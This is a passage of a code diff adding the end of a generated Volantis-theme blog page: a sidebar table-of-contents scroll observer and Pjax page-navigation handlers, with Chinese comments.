+    let intersectionObserver = new IntersectionObserver(
+      (entries, observe) => {
+        let scrollHeight = document.documentElement.scrollHeight + 100;
+        if (scrollHeight > marginTop) {
+          observe.disconnect();
+          createIntersectionObserver(scrollHeight);
+          return;
+        }
+        let index = findIndex(entries);
+        activateNavByIndex(navItems[index]);
+      },
+      {
+        rootMargin: marginTop + "px 0px -100% 0px",
+        threshold: 0,
+      }
+    );
+    sections.forEach((element) => {
+      element && intersectionObserver.observe(element);
+    });
+  }
+  createIntersectionObserver(document.documentElement.scrollHeight);
+}
+
+document.addEventListener("DOMContentLoaded", listennSidebarTOC);
+document.addEventListener("pjax:success", listennSidebarTOC);
+</script>
+
+<!-- more -->
+
+ 
+	   
+	    
+
+
+<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>
+
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      //window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+
+      volantis.$switcher.removeClass('active'); // 关闭移动端激活的搜索框
+      volantis.$header.removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      volantis.$wrapper.removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      volantis.$topBtn.unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+	  // 使用 volantis.pjax.send 方法传入pjax:send回调函数 参见layout/_partial/scripts/global.ejs
+	  volantis.pjax.method.send.start();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+      try{
+		// 使用 volantis.pjax.push 方法传入重载函数 参见layout/_partial/scripts/global.ejs
+		volantis.pjax.method.complete.start();
+      } catch (e) {
+        console.log(e);
+      }
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+	  // 使用 volantis.pjax.error 方法传入pjax:error回调函数 参见layout/_partial/scripts/global.ejs
+	  volantis.pjax.method.error.start();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+ 
+	  
+    </div>
+  </body>
+</html>
